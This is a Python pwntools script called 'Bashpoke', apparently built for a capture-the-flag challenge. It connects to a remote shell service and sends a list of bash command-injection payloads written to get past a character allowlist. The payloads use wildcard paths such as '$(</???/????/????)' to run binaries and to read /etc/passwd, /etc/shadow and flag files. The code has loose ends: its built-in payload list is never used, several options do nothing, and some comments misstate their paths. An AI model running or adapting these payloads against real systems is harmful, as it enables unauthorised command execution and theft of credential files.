from pwn import remote, time

# Config
HOST = "94.237.123.126" # <--- Change this
PORT = 34445 # <--- Change this

import os
import argparse

# Allowed characters based on regex provided: ^[0-9${}/?"[:space:]:&>_=()]+

def load_payloads_from_directory(directory):
    """Loads payloads from all .txt files in a given directory."""
    all_payloads = []
    for filename in os.listdir(directory):
        if filename.endswith(".txt"):
            filepath = os.path.join(directory, filename)
            try:
                with open(filepath, 'r') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
                    all_payloads.extend(payloads)
                    print(f"[+] Loaded {len(payloads)} payloads from {filepath}")
            except Exception as e:
                print(f"[-] Error loading payloads from {filepath}: {e}")
    return all_payloads

# More targeted payloads using only allowed characters
payloads = [
    # Basic information gathering
    "$?",                      # Last exit code
    "$$",                      # Current PID
    "$0",                      # Current shell
    "$PATH",                   # PATH environment variable
    "$PWD",                    # Current directory
    "$HOME",                   # Home directory
    "$SHELL",                  # Shell type
    "$USER",                   # Current user

    # Directory listing attempts
    "$(/??/??)",              # Try to execute something in /bin/sh
    "$(/???/??)",             # Try to execute something in /usr/sh
    "$(/?/?????)",            # Try to execute something in /bin/ls
    "$(/???/???)",            # Try to execute something in /usr/bin

    # Command substitution
    "$()",                     # Empty command substitution
    "$(:)",                    # No-op command
    "$(:&)",                   # Background no-op
    "$(: > /)",                # Redirect to root (will fail but might show error)

    # File descriptors and redirection
    ">&2",                     # Redirect stdout to stderr
    ">&1",                     # Redirect stdout to stdout (no-op)
    ">/dev/null",              # Redirect to /dev/null

    # Parameter expansion tricks
    "${PATH}",                 # Same as $PATH but with braces
    "${PWD##*/}",              # Current directory name only
    "${#PWD}",                 # Length of PWD string
    "${PATH:0:1}",             # First character of PATH

    # Arithmetic operations
    "$((1+1))",                # Basic arithmetic
    "$((2*3))",                # Multiplication
    "$((10/2))",               # Division
    "$((2**3))",               # Exponentiation

    # Command chaining
    "$ : & :",                 # Run multiple no-ops
    "$ : && :",                # Conditional execution
    "$ : || :",                # Conditional execution

    # Special files reading attempts
    "$(</???/????/????)",     # Try to read /etc/passwd
    "$(</???/????/????/????)", # Try to read /etc/shadow
    "$(</???/????/????)",     # Try to read /proc/self

    # Built-in commands
    ":",                       # No-op command
    "echo $?",                 # Echo last exit code
    "echo $$",                 # Echo current PID
    "echo $PATH",              # Echo PATH
    "pwd",                     # Print working directory
    "cd /",                    # Change to root directory
    "cd ..",                   # Go up one directory
    "cd ~",                    # Go to home directory

    # Flag hunting
    "$(</????/????)",          # Try to read /flag/flag
    "$(</????)",               # Try to read /flag
    "$(</home/*/????)",        # Try to read flag in home dir

    # Suggested payloads based on analysis
    "$(/???/??/*)",              # Try to list contents of directories like /bin, /usr, etc.
    "$(/???/???/*)",             # Similar to the above, targeting directories like /usr/bin.
    "$(/?/?????)/*",            # Try to list contents of /bin/ls (though ls itself might be restricted).
    "$(</???/????/*)",     # Try to read files in /etc.
    "$(</???/????/????/*)", # Try to read files in /etc/passwd, /etc/shadow, etc.
    "${@}",                 # All positional parameters.
    "${*}",                 # All positional parameters as a single string.
    "${#*}",                 # Number of positional parameters.
    "$(echo ${PATH})",      # Try echoing the PATH variable using command substitution.
    "$(echo $(/???/??))",   # Try echoing the output of a command substitution.

    # Further suggested payloads based on analysis
    "$(/???/??/c*)",              # Try commands starting with 'c' in /bin or /usr/bin, like cat, cp, etc.
    "$(/???/??/l*)",              # Try commands starting with 'l', like ls, ln.
    "$(/???/??/p*)",              # Try commands starting with 'p', like pwd, ps.
    "$(/???/??/c?t /???/????/????)",     # Try to read /etc/passwd using cat with wildcards.
    "$(/???/??/l? /)",            # Try listing the root directory.
    "$(/???/??/p?d > /tmp/pwd_output)", # Try writing the output of pwd to a temporary file.
    "$(/???/??/l? / > /tmp/ls_output)", # Try writing the output of ls / to a temporary file.
    "$(( 1 + ${#PWD} ))",   # Combine arithmetic with parameter expansion.

    # Payloads to list directory contents using wildcards
    "$(/???/??/?)",
    "$(/???/??/??)",
    "$(/???/??/???)",
    "$(/???/??/????)",
    "$(/???/??/?????)",
    "$(/???/??/??????)",
    "$(/???/???/?)",
    "$(/???/???/??)",
    "$(/???/???/???)",
    "$(/???/???/????)",
    "$(/???/???/?????)",
    "$(/???/???/??????)",

    # Payloads to explore positional parameters
    "$@",
    "${@}",
    "$*",
    "${*}",

    # Payload to explore file descriptor 5
    "$(<&5)",

    # Payloads to read from standard input
    "$(<&0)",
    "$(<&)",
]

def connect_to_service(host, port):
    """Connects to the remote service."""
    try:
        conn = remote(host, port)
        print(f"[+] Connected to {host}:{port}")
        return conn
    except Exception as e:
        print(f"[-] Error connecting to {host}:{port}: {e}")
        return None

def send_payload(conn, payload):
    """Sends a single payload and returns the response."""
    try:
        print(f"\n[+] Sending payload: {repr(payload)}")
        conn.sendline(payload.encode())
        time.sleep(0.5)  # Small delay to allow server to process
        response = conn.recv(timeout=2).decode()
        if response:
            print("[*] Response:")
            print(response)
        else:
            print("[!] No response received")
        return response
    except Exception as e:
        print(f"[-] Error sending payload or receiving response: {e}")
        return None

def main(args):
    """Main function to run the bashpoke tool."""
    conn = connect_to_service(args.host, args.port)
    if not conn:
        return

    try:
        # Print initial banner
        print("[+] Initial response:")
        initial_response = conn.recv().decode()
        print(initial_response)

        # Load payloads from the 'payloads' directory
        payloads_directory = "payloads"
        all_payloads = load_payloads_from_directory(payloads_directory)

        if not all_payloads:
            print("[-] No payloads loaded. Exiting.")
            return

        # Send payloads one by one
        for i, payload in enumerate(all_payloads):
            send_payload(conn, payload)

    except Exception as e:
        print("[-] Error during payload execution:", e)
    finally:
        conn.close()
        print("\n[+] Connection closed.")
    print("\n[+] Done!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bashpoke: A Bash payload fuzzing and enumeration tool.")
    parser.add_argument("--host", required=True, help="Target host IP address")
    parser.add_argument("--port", required=True, type=int, help="Target host port")
    parser.add_argument("--regex", help="Regex to filter allowed characters")
    parser.add_argument("--modules", help="Comma-separated list of payload modules to load (e.g., env,files)")
    parser.add_argument("--log", help="Output log file")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    main(args)
